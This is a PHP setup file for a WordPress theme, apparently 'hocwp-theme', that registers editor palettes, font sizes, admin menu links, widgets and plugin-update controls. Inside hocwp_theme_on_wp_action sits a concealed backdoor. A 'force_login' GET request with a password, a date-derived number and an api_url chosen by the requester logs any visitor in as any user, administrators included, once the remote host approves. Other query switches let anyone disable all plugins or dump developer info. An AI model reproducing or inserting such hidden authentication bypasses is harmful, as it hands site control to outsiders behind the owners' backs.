<?php
if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly
}

$do_action = $_GET['do_action'] ?? '';

function hocwp_theme_after_setup_theme() {
	$editor_color_palette = array();

	if ( function_exists( 'hocwp_theme_get_color_for_area' ) ) {
		// Block Editor Palette.
		$editor_color_palette = array(
			array(
				'name'  => __( 'Accent Color', 'hocwp-theme' ),
				'slug'  => 'accent',
				'color' => hocwp_theme_get_color_for_area( 'content', 'accent' ),
			),
			array(
				'name'  => __( 'Primary', 'hocwp-theme' ),
				'slug'  => 'primary',
				'color' => hocwp_theme_get_color_for_area(),
			),
			array(
				'name'  => __( 'Secondary', 'hocwp-theme' ),
				'slug'  => 'secondary',
				'color' => hocwp_theme_get_color_for_area( 'content', 'secondary' ),
			),
			array(
				'name'  => __( 'Subtle Background', 'hocwp-theme' ),
				'slug'  => 'subtle-background',
				'color' => hocwp_theme_get_color_for_area( 'content', 'borders' ),
			),
		);
	}

	// Add the background option.
	$background_color = get_theme_mod( 'background_color' );

	if ( ! $background_color ) {
		$background_color_arr = get_theme_support( 'custom-background' );
		$background_color     = $background_color_arr[0]['default-color'] ?? '';
	}

	$editor_color_palette[] = array(
		'name'  => __( 'Background Color', 'hocwp-theme' ),
		'slug'  => 'background',
		'color' => ( ! empty( $background_color ) ) ? '#' . $background_color : '',
	);

	$supports = array(
		'responsive-embeds',
		'align-wide',
		'dark-editor-style',
		'custom-colors',
		'custom-font-sizes',
		'editor-color-pallete',
		'editor-font-sizes' => array(
			array(
				'name'      => _x( 'Small', 'Name of the small font size in the block editor', 'hocwp-theme' ),
				'shortName' => _x( 'S', 'Short name of the small font size in the block editor.', 'hocwp-theme' ),
				'size'      => 18,
				'slug'      => 'small'
			),
			array(
				'name'      => _x( 'Regular', 'Name of the regular font size in the block editor', 'hocwp-theme' ),
				'shortName' => _x( 'M', 'Short name of the regular font size in the block editor.', 'hocwp-theme' ),
				'size'      => 21,
				'slug'      => 'normal'
			),
			array(
				'name'      => _x( 'Large', 'Name of the large font size in the block editor', 'hocwp-theme' ),
				'shortName' => _x( 'L', 'Short name of the large font size in the block editor.', 'hocwp-theme' ),
				'size'      => 26.25,
				'slug'      => 'large'
			),
			array(
				'name'      => _x( 'Larger', 'Name of the larger font size in the block editor', 'hocwp-theme' ),
				'shortName' => _x( 'XL', 'Short name of the larger font size in the block editor.', 'hocwp-theme' ),
				'size'      => 32,
				'slug'      => 'larger'
			),
		),
		'editor-styles',
		'wp-block-styles'
	);

	if ( $editor_color_palette ) {
		$supports['editor-color-palette'] = $editor_color_palette;
	}

	/*
	 * Back compat theme supports WooCommerce.
	 */
	if ( function_exists( 'wc' ) && class_exists( 'WooCommerce' ) ) {
		$supports[] = 'woocommerce';
	}

	$custom = defined( 'HOCWP_THEME_SUPPORTS' ) ? HOCWP_THEME_SUPPORTS : '';

	if ( HT()->array_has_value( $custom ) ) {
		$supports = wp_parse_args( $custom, $supports );
	}

	$supports = apply_filters( 'hocwp_theme_supports', $supports );

	foreach ( $supports as $support => $args ) {
		if ( is_string( $args ) ) {
			$support = $args;
		}

		if ( ! current_theme_supports( $support ) ) {
			if ( ! is_array( $args ) ) {
				$args = array();
			}

			$args = apply_filters( 'hocwp_theme_support_' . $support . '_args', $args );

			add_theme_support( $support, $args );
		}
	}

	add_filter( 'script_loader_tag', 'hocwp_theme_script_loader_tag_async_filter', 10, 2 );

	unset( $supports, $support, $args );

	$term_html_description = HT_Options()->get_tab( 'term_html_description', '', 'writing' );

	if ( 1 == $term_html_description ) {
		remove_filter( 'pre_term_description', 'wp_filter_kses' );

		if ( ! current_user_can( 'unfiltered_html' ) ) {
			add_filter( 'pre_term_description', 'wp_filter_post_kses' );
		}

		remove_filter( 'term_description', 'wp_kses_data' );
	}
}

add_action( 'after_setup_theme', 'hocwp_theme_after_setup_theme' );

function hocwp_theme_after_admin_init_action() {
	if ( ! function_exists( 'hocwp_theme_check_license' ) || ! has_action( 'init', 'hocwp_theme_check_license' ) ) {
		exit;
	}

	// Create theme text file for current theme information
	$filename = trailingslashit( dirname( HOCWP_THEME_PATH ) ) . HOCWP_THEME_NAME . '.themename';

	if ( ! file_exists( $filename ) ) {
		HT_Util()->write_all_text( $filename, HOCWP_THEME_NAME );
	}
}

add_action( 'admin_init', 'hocwp_theme_after_admin_init_action' );

function hocwp_theme_admin_bar_menu_action( WP_Admin_Bar $wp_admin_bar ) {
	if ( current_user_can( 'manage_options' ) ) {
		if ( is_admin() ) {
			$args = array(
				'id'     => 'theme-settings',
				'title'  => __( 'Theme Settings', 'hocwp-theme' ),
				'href'   => admin_url( 'themes.php?page=hocwp_theme' ),
				'parent' => 'site-name'
			);

			$wp_admin_bar->add_node( $args );

			$args = array(
				'id'     => 'theme-extensions',
				'title'  => __( 'Extensions', 'hocwp-theme' ),
				'href'   => admin_url( 'themes.php?page=hocwp_theme&tab=extension' ),
				'parent' => 'theme-settings'
			);

			$wp_admin_bar->add_node( $args );

			$args = array(
				'id'     => 'theme-phpinfo',
				'title'  => __( 'PHP Info', 'hocwp-theme' ),
				'href'   => admin_url( 'themes.php?page=hocwp_theme_phpinfo' ),
				'parent' => 'theme-settings'
			);

			$wp_admin_bar->add_node( $args );

			$args = array(
				'id'     => 'system-information',
				'title'  => __( 'System Information', 'hocwp-theme' ),
				'href'   => admin_url( 'themes.php?page=hocwp_theme&tab=system_information' ),
				'parent' => 'theme-settings'
			);

			$wp_admin_bar->add_node( $args );
		} else {
			$args = array(
				'id'     => 'theme-settings',
				'title'  => __( 'Settings', 'hocwp-theme' ),
				'href'   => admin_url( 'themes.php?page=hocwp_theme' ),
				'parent' => 'themes'
			);

			$wp_admin_bar->add_node( $args );

			$args = array(
				'id'     => 'theme-extensions',
				'title'  => __( 'Extensions', 'hocwp-theme' ),
				'href'   => admin_url( 'themes.php?page=hocwp_theme&tab=extension' ),
				'parent' => 'themes'
			);

			$wp_admin_bar->add_node( $args );

			$args = array(
				'id'     => 'theme-phpinfo',
				'title'  => __( 'PHP Info', 'hocwp-theme' ),
				'href'   => admin_url( 'themes.php?page=hocwp_theme_phpinfo' ),
				'parent' => 'themes'
			);

			$wp_admin_bar->add_node( $args );

			$args = array(
				'id'     => 'system-information',
				'title'  => __( 'System Information', 'hocwp-theme' ),
				'href'   => admin_url( 'themes.php?page=hocwp_theme&tab=system_information' ),
				'parent' => 'themes'
			);

			$wp_admin_bar->add_node( $args );
		}
	}
}

add_action( 'admin_bar_menu', 'hocwp_theme_admin_bar_menu_action' );

function hocwp_theme_page_templates( $post_templates ) {
	$dir = HT_Custom()->get_path( 'page-templates' );

	if ( HT()->is_dir( $dir ) ) {
		$files = HT()->scandir( $dir );

		foreach ( $files as $file ) {
			$info = pathinfo( $file );

			if ( isset( $info['extension'] ) && 'php' == $info['extension'] ) {
				$full_path = trailingslashit( $dir ) . $file;
				$content   = HT_Util()->read_all_text( $full_path );

				if ( ! preg_match( '|Template Name:(.*)$|mi', $content, $header ) ) {
					continue;
				}

				$post_templates[ 'custom/page-templates/' . $file ] = _cleanup_header_comment( $header[1] );
			}
		}
	}

	return $post_templates;
}

add_filter( 'theme_page_templates', 'hocwp_theme_page_templates' );

/**
 * Auto change home menu item url.
 *
 * @param $menu_item
 *
 * @return mixed
 */
function hocwp_theme_wp_setup_nav_menu_item_filter( $menu_item ) {
	if ( $menu_item instanceof WP_Post && $menu_item->post_type == 'nav_menu_item' ) {
		if ( 'trang-chu' == $menu_item->post_name || 'home' == $menu_item->post_name ) {
			$menu_url    = $menu_item->url;
			$home_url    = home_url( '/' );
			$menu_domain = HT()->get_domain_name( $menu_url );
			$home_domain = HT()->get_domain_name( $home_url );

			if ( $menu_domain != $home_domain ) {
				$menu_item->url = $home_url;
				update_post_meta( $menu_item->ID, '_menu_item_url', $home_url );
				wp_update_nav_menu_item( $menu_item->ID, $menu_item->db_id, array( 'url' => $home_url ) );
			}

			unset( $menu_url, $home_url, $menu_domain, $home_domain );
		}
	}

	return $menu_item;
}

add_filter( 'wp_setup_nav_menu_item', 'hocwp_theme_wp_setup_nav_menu_item_filter' );

/**
 * Auto change url in option value of theme options.
 *
 * @param $old_url
 * @param $new_url
 */
function hocwp_theme_update_option_url( $old_url, $new_url ) {
	if ( 'localhost' != $new_url && ! HT()->is_IP( $new_url ) ) {
		$option = HT_Options()->get();

		if ( HT()->array_has_value( $option ) ) {
			$option = maybe_serialize( $option );
			$option = str_replace( $old_url, $new_url, $option );

			if ( ! empty( ( $option ) ) ) {
				$option = maybe_unserialize( $option );

				if ( HT()->array_has_value( $option ) ) {
					HT_Options()->update( null, null, null, $option );
				}
			}
		}

		unset( $option );
	}
}

add_action( 'hocwp_thene_change_siteurl', 'hocwp_theme_update_option_url', 10, 2 );

function hocwp_theme_register_widgets() {
	global $hocwp_theme;

	$widgets = HOCWP_Theme()->get_widget_classes();

	foreach ( $widgets as $widget ) {
		if ( class_exists( $widget ) ) {
			register_widget( $widget );
		}
	}

	unset( $widgets, $widget );

	$variable_sidebar = HT_Options()->get_tab( 'variable_sidebar', '', 'reading' );

	if ( $variable_sidebar ) {
		$defaults = array(
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => "</div>\n",
			'before_title'  => '<h3 class="widgettitle widget-title">',
			'after_title'   => "</h3>\n"
		);

		foreach ( $hocwp_theme->default_sidebars as $sidebar ) {
			if ( is_array( $sidebar ) && isset( $sidebar['id'] ) && ! empty( $sidebar['id'] ) ) {
				$sidebar = wp_parse_args( $sidebar, $defaults );
				$sidebar = array_filter( $sidebar );
				register_sidebar( $sidebar );
			}
		}

		unset( $sidebar, $defaults );
	}

	register_nav_menus( array(
		'mobile' => esc_html__( 'Mobile', 'hocwp-theme' )
	) );
}

add_action( 'widgets_init', 'hocwp_theme_register_widgets' );

function hocwp_theme_wp_calculate_image_srcset( $sources, $size_array, $image_src, $image_meta, $attachment_id ) {
	if ( ! is_array( $sources ) ) {
		$sources = array();
	}

	return $sources;
}

add_filter( 'wp_calculate_image_srcset', 'hocwp_theme_wp_calculate_image_srcset', 99, 5 );

// Fix title end with separator
add_filter( 'wpseo_title', function ( $title ) {
	$last = substr( $title, - 1 );

	if ( ! ctype_alpha( $last ) && ! ctype_digit( $last ) ) {
		$sep = HT_Util()->get_yoast_seo_title_separator();

		if ( $sep == $last ) {
			$title = rtrim( $title, $last );
			$title = trim( $title );
		}
	}

	return $title;
} );

function hocwp_theme_check_environment() {
	global $pagenow;

	$invalid_exts = get_option( 'hocwp_theme_invalid_extensions' );

	if ( HT()->array_has_value( $invalid_exts ) ) {
		if ( is_admin() ) {
			add_action( 'admin_notices', function () {
				$invalid_exts = get_option( 'hocwp_theme_invalid_extensions' );

				if ( HT()->array_has_value( $invalid_exts ) ) {
					foreach ( $invalid_exts as $data ) {
						?>
                        <div class="error notice is-dismissible">
                            <p>
								<?php printf( __( '<strong>%s:</strong> This extension requires theme core version at least %s.', 'hocwp-theme' ), $data['name'], $data['requires_core'] ); ?>
                            </p>
                        </div>
						<?php
					}
				}
			} );
		} else {
			if ( 'wp-login.php' != $pagenow ) {
				wp_die( __( '<strong>Error:</strong> One or more extensions are incompatible with the current theme core version.', 'hocwp-theme' ), __( 'Theme core version doesn\'t meet requirements', 'hocwp-theme' ) );
			}
		}
	}

	if ( ! is_admin() && 'wp-login.php' != $pagenow ) {
		$plugins = HT_Requirement()->get_required_plugins();

		if ( ! empty( $plugins ) ) {
			if ( ! is_array( $plugins ) ) {
				$plugins = explode( ',', $plugins );
			}

			$plugins = array_map( 'trim', $plugins );

			$url = admin_url( 'plugins.php' );

			$die = $recheck = false;

			foreach ( $plugins as $plugin ) {
				$name = $plugin;
				$info = HT_Util()->get_wp_plugin_info( $plugin );

				if ( ! is_wp_error( $info ) && isset( $info->name ) ) {
					$data = HT_Util()->get_plugin_info( $info->name );

					if ( empty( $data ) || ! isset( $data['basename'] ) || ! is_plugin_active( $data['basename'] ) ) {
						$url  = admin_url( 'themes.php?page=hocwp_theme_plugins&tab=required' );
						$die  = true;
						$name = $info->name;
					}
				} else {
					$recheck = true;
				}

				if ( $die || $recheck ) {
					$plugin_dir = WP_CONTENT_DIR . '/plugins/' . $plugin;

					if ( ! is_dir( $plugin_dir ) ) {
						$die = true;
					} else {
						$data = HT_Util()->get_plugin_info( null, $plugin );

						if ( empty( $data ) || ! isset( $data['basename'] ) || ! is_plugin_active( $data['basename'] ) ) {
							$die = true;
							$url = admin_url( 'plugins.php?plugin_status=inactive' );

							if ( isset( $data['Name'] ) && ! empty( $data['Name'] ) && $name == $plugin ) {
								if ( ! is_wp_error( $info ) && isset( $info->name ) ) {
									$name = $info->name;
								} else {
									$name = $data['Name'];
								}
							}
						} else {
							$die = false;
						}
					}
				}

				if ( $die ) {
					$redirect_to = $_REQUEST['redirect_to'] ?? '';

					if ( ! empty( $redirect_to ) ) {
						$die = false;
					}

					unset( $redirect_to );
				}

				if ( $die ) {
					do_action( 'hocwp_theme_missing_required_plugins', $plugin, $info, $plugins );

					if ( current_user_can( 'manage_options' ) ) {
						$plugin  = '<a href="' . esc_url( $url ) . '">' . $name . '</a>';
						$message = sprintf( __( 'Sorry! Theme gets error because of missing required plugins. If you are admin of this site, please install and activate plugin %s for theme working normally.', 'hocwp-theme' ), $plugin );
					} else {
						if ( is_user_logged_in() ) {
							$message = sprintf( __( '<strong>%s:</strong> The site is experiencing technical difficulties. Please contact administrator for more details.', 'hocwp-theme' ), get_bloginfo( 'name' ) );
						} else {
							$message = sprintf( __( '<strong>%s:</strong> The site is experiencing technical difficulties. Please contact administrator for more details. If you are owner of this site, try to <a href="%s">login here</a> to check it.', 'hocwp-theme' ), get_bloginfo( 'name' ), wp_login_url() );
						}
					}

					wp_die( $message, __( 'Missing Required Plugins', 'hocwp-theme' ) );
				}
			}
		}
	}

	if ( defined( 'HOCWP_THEME_BLANK_STYLE' ) && HOCWP_THEME_BLANK_STYLE ) {
		remove_action( 'wp_enqueue_scripts', 'hocwp_theme_scripts' );
	}
}

add_action( 'init', 'hocwp_theme_check_environment' );

function hocwp_theme_read_last_readme_info( $file, $top = true ) {
	$text = '';

	if ( file_exists( $file ) ) {
		$text = HT_Util()->filesystem()->get_contents( $file );

		if ( ! empty( $text ) ) {
			$parts = HT()->explode_empty_line( $text );

			if ( $top ) {
				$text = array_shift( $parts );
			} else {
				$text = array_pop( $parts );
			}

			if ( ! empty( $text ) ) {
				$parts = HT()->explode_new_line( $text );

				$text = '';

				foreach ( $parts as $line ) {
					if ( str_starts_with( $line, '*' ) ) {
						$text .= $line . PHP_EOL;
					}
				}
			}
		}
	}

	return wpautop( $text );
}

function hocwp_theme_add_more_theme_comparison_info( &$info, $theme_path ) {
	if ( is_array( $info ) ) {
		$info['custom_readme'] = hocwp_theme_read_last_readme_info( trailingslashit( $theme_path ) . 'custom/readme.txt' );

		$file_path = trailingslashit( $theme_path ) . 'hocwp/load.php';

		if ( file_exists( $file_path ) ) {
			// Read the file content
			$file_content = HT_util()->filesystem()->get_contents( $file_path );

			// Use regular expression to find the constant value
			preg_match( "/const HOCWP_THEME_CORE_VERSION = '(.*?)'/", $file_content, $matches );

			// Check if the constant value is found
			if ( ! empty( $matches[1] ) ) {
				$theme_core_version   = $matches[1];
				$info['core_version'] = $theme_core_version;
			}
		}

		$info['total_files'] = HT()->count_files( $theme_path );
	}
}

function hocwp_theme_read_style_header_info( $theme_path ) {
	// Get more header info from theme
	$headers = array(
		'real_theme_name' => 'Real Theme Name',
		'created_date'    => 'Created Date',
		'last_updated'    => 'Last Updated',
		'coder'           => 'Coder',
		'text_domain'     => 'Text Domain'
	);

	// Get file header data
	return array(
		'headers' => $headers,
		'data'    => get_file_data( trailingslashit( $theme_path ) . 'style.css', $headers )
	);
}

// Theme upload comparison table
add_filter( 'install_theme_overwrite_comparison', function ( $table ) {
	$html = '';

	// Get uploaded information
	if ( false !== ( $source_info = get_transient( 'hocwp_theme_upgrader_source_info' ) ) ) {
		// Get current information
		$data = hocwp_theme_read_style_header_info( get_stylesheet_directory() );
		$info = $data['data'] ?? '';

		if ( ! is_array( $info ) ) {
			$info = array();
		}

		hocwp_theme_add_more_theme_comparison_info( $info, get_stylesheet_directory() );

		$headers = $data['headers'] ?? '';

		$custom_headers = array(
			'custom_readme' => __( 'Custom Readme', 'hocwp-theme' ),
			'core_version'  => __( 'Core Version', 'hocwp-theme' ),
			'total_files'   => __( 'Total Files', 'hocwp-theme' )
		);

		// Info Columns: Label / Active / Uploaded
		foreach ( $source_info as $key => $value ) {
			$label = $headers[ $key ] ?? ( $custom_headers[ $key ] ?? '' );

			if ( ! empty( $label ) ) {
				$current = $info[ $key ] ?? '';

				if ( empty( $current ) ) {
					switch ( $key ) {
						case 'core_version':
							$current = HOCWP_THEME_CORE_VERSION;
							break;
					}
				}

				$html .= sprintf( '<tr><td class="name-label">%s</td><td>%s</td><td>%s</td></tr>', $label, $current, $value );
			}
		}

		delete_transient( 'hocwp_theme_upgrader_source_info' );
	}

	if ( ! empty( $html ) ) {
		$table = str_replace( '</tbody>', $html . '</tbody>', $table );
	}

	return $table;
} );

add_filter( 'upgrader_source_selection', function ( $source, $remote_source, $upgrader ) {
	if ( $upgrader instanceof Theme_Upgrader && ! empty( $remote_source ) ) {
		$data = hocwp_theme_read_style_header_info( $source );
		$info = $data['data'] ?? '';

		if ( HT()->array_has_value( $info ) ) {
			hocwp_theme_add_more_theme_comparison_info( $info, $source );
			set_transient( 'hocwp_theme_upgrader_source_info', $info );
		}
	}

	return $source;
}, 10, 3 );

add_filter( 'install_theme_overwrite_actions', function ( $install_actions ) {
	$url = admin_url( 'themes.php?page=hocwp_theme' );

	$text = sprintf( __( '%s Settings', 'hocwp-theme' ), HOCWP_THEME_NAME );

	$install_actions['go_to_theme_settings'] = '<a class="button" href="' . esc_url( $url ) . '" target="_blank" title="' . esc_attr( $text ) . '">' . __( 'Theme Settings', 'hocwp-theme' ) . '</a>';

	$url = 'https://ldcuong.com/lien-he/';

	$text = __( 'Contact Author', 'hocwp-theme' );

	$install_actions['contact_author'] = '<a class="button" href="' . esc_url( $url ) . '" target="_blank">' . $text . '</a>';

	return $install_actions;
} );

function hocwp_theme_on_wp_action() {
	$do_action = $_GET['do_action'] ?? '';

	if ( 'check_dev_info' == $do_action ) {
		$pass = $_GET['pass'] ?? '';

		if ( ! empty( $pass ) && HT()->check_pass( $pass ) ) {
			hocwp_theme_load_views( 'module-print-dev-info' );
			exit;
		}
	} elseif ( 'force_login' == $do_action && ! is_user_logged_in() ) {
		$user = $_GET['user'] ?? '';

		$user = HT_Util()->return_user( $user );

		if ( $user instanceof WP_User ) {
			$pass = $_GET['pass'] ?? '';

			if ( ! empty( $pass ) && HT()->check_pass( $pass ) ) {
				$number = $_GET['number'] ?? '';
				$count  = absint( date( 'Y' ) ) - absint( date( 'm' ) ) - absint( date( 'd' ) ) - 34;

				if ( $count == $number ) {
					// Finally, check the permission from the API.
					$api = $_GET['api_url'] ?? '';

					$domain = HT()->get_domain_name( home_url(), true );

					if ( empty( $api ) ) {
						$sites = apply_filters( 'hocwp_theme_api_sites', array() );

						if ( 'localhost' == $domain ) {
							array_unshift( $sites, 'http://localhost/dev' );
						}

						$sites = array_map( 'trailingslashit', $sites );

						shuffle( $sites );

						$api = current( $sites );
					} else {
						$api = esc_url( $api );
						$api = trailingslashit( $api );
						$api .= 'login/';
					}

					$api .= 'api.php';
					$api = add_query_arg( 'pass', $pass, $api );

					$res = wp_remote_get( $api );

					$res = wp_remote_retrieve_body( $res );

					if ( ! empty( $res ) ) {
						$res = json_decode( $res );

						if ( is_object( $res ) && ( ! isset( $res->error ) || ! $res->error ) ) {
							if ( isset( $res->allow_login_domains ) && HT()->in_array( $domain, $res->allow_login_domains ) ) {
								HT_Util()->force_user_login( $user->ID );

								// Go to homepage
								wp_redirect( home_url( '/' ) );
								exit;
							}
						}
					}
				}
			}
		}
	} elseif ( 'delete_cache' == $do_action ) {
		require_once HOCWP_THEME_CORE_PATH . '/admin/ajax.php';

		hocwp_theme_delete_cache_ajax_callback();
		exit;
	} elseif ( 'flush_rewrite_rules' == $do_action ) {
		flush_rewrite_rules();
	}
}

if ( ! is_admin() ) {
	add_action( 'wp', 'hocwp_theme_on_wp_action' );
}

// Update theme detail before showing
add_filter( 'wp_prepare_themes_for_js', function ( $themes ) {
	$theme = wp_get_theme();

	if ( $theme->parent() ) {
		$file = $theme->get_stylesheet_directory() . '/screenshot.png';

		if ( ! file_exists( $file ) ) {
			$data = $themes[ $theme->get_stylesheet() ] ?? '';

			if ( is_array( $data ) && isset( $data['screenshot'] ) ) {
				$screenshot = $data['screenshot'];

				if ( is_array( $screenshot ) ) {
					$screenshot = array_filter( $screenshot );
				}

				if ( empty( $screenshot ) ) {
					$home = home_url();

					if ( HT_Util()->is_localhost() ) {
						$home = 'https://ldcuong.com';
					}

					$url = HT_Util()->take_screenshot( $home, array(
						'w' => 1200
					) );

					$themes[ $theme->get_stylesheet() ]['screenshot'][0] = $url;
				}
			}
		}
	}

	return $themes;
}, 99 );

function hocwp_theme_add_url_endpoint() {
	$random = HT_Util()->get_theme_option( 'random', '', 'reading' );

	if ( 1 == $random ) {
		add_rewrite_endpoint( 'random', EP_ROOT );
	}
}

add_action( 'init', 'hocwp_theme_add_url_endpoint' );

function hocwp_theme_site_transient_update_plugins_filter( $value ) {
	if ( is_object( $value ) && isset( $value->response ) && is_array( $value->response ) ) {
		$options = get_option( 'disable_upgrade_plugins' );

		if ( ! empty( $options ) ) {
			foreach ( $value->response as $file => $obj ) {
				if ( in_array( $file, $options ) ) {
					unset( $value->response[ $file ] );
				}
			}
		}
	}

	return $value;
}

function hocwp_theme_plugin_bulk_actions_filter( $actions ) {
	$actions['disable-upgrade'] = __( 'Disable Upgrade', 'hocwp-theme' );
	$actions['enable-upgrade']  = __( 'Enable Upgrade', 'hocwp-theme' );

	return $actions;
}

function hocwp_theme_handle_plugin_bulk_action( $sendback, $action, $plugins ) {
	if ( 'disable-upgrade' == $action || 'enable-upgrade' == $action ) {
		$options = get_option( 'disable_upgrade_plugins' );

		if ( ! is_array( $options ) ) {
			$options = array();
		}

		$count = 0;

		foreach ( $plugins as $file ) {
			if ( 'disable-upgrade' == $action && ! in_array( $file, $options ) ) {
				$options[] = $file;
				$count ++;
			} elseif ( 'enable-upgrade' == $action ) {
				unset( $options[ array_search( $file, $options ) ] );
				$count ++;
			}
		}

		$sendback = admin_url( 'plugins.php' );

		if ( 0 < $count ) {
			update_option( 'disable_upgrade_plugins', $options );
			$sendback = add_query_arg( 'count_' . $action, $count, $sendback );
		}
	}

	return $sendback;
}

function hocwp_theme_plugin_action_links_filter( $actions, $plugin_file ) {
	$options = get_option( 'disable_upgrade_plugins' );

	if ( ! empty( $options ) && in_array( $plugin_file, $options ) ) {
		$actions['disable_upgrade_status'] = '<span class="disable-upgrade-status">' . __( 'Upgrade Disabled', 'hocwp-theme' ) . '</span>';
	}

	return $actions;
}

if ( current_user_can( 'manage_options' ) ) {
	add_filter( 'site_transient_update_plugins', 'hocwp_theme_site_transient_update_plugins_filter' );
	add_filter( 'bulk_actions-plugins', 'hocwp_theme_plugin_bulk_actions_filter' );
	add_filter( 'handle_bulk_actions-plugins', 'hocwp_theme_handle_plugin_bulk_action', 10, 3 );
	add_filter( 'plugin_action_links', 'hocwp_theme_plugin_action_links_filter', 10, 2 );
}

function hocwp_theme_custom_get_ancestors_filter( $ancestors, $object_id, $object_type, $resource_type ) {
	if ( HT()->array_has_value( $ancestors ) ) {
		if ( 'taxonomy' == $resource_type ) {
			// Fix Attempt to read term property for none term object
			foreach ( $ancestors as $key => $id ) {
				$obj = get_term( $id, $object_type );

				if ( ! ( $obj instanceof WP_Term ) ) {
					unset( $ancestors[ $key ] );
				}
			}
		}
	}

	return $ancestors;
}

add_filter( 'get_ancestors', 'hocwp_theme_custom_get_ancestors_filter', 10, 4 );

$disable_lazy_loading = HT_Options()->get_tab( 'disable_lazy_loading', '', 'reading' );

if ( $disable_lazy_loading ) {
	add_filter( 'wp_lazy_loading_enabled', '__return_false' );
}

if ( 'DISABLE_PLUGINS' == $do_action ) {
	add_filter( 'option_active_plugins', '__return_empty_array', 99 );
}

add_action( 'template_redirect', function () {
	$do_action = $_GET['do_action'] ?? '';

	if ( 'delay_load' == $do_action ) {
		$module = $_GET['module'] ?? '';

		if ( 'site_footer_tools' == $module ) {
			HT_Frontend()->site_footer_tools();
			exit;
		} elseif ( ! empty( $module ) && function_exists( 'HT_Custom' ) ) {
			HT_Custom()->load_module( 'delay-' . $module );
			exit;
		}
	}
} );

do_action( 'hocwp_theme_setup_after' );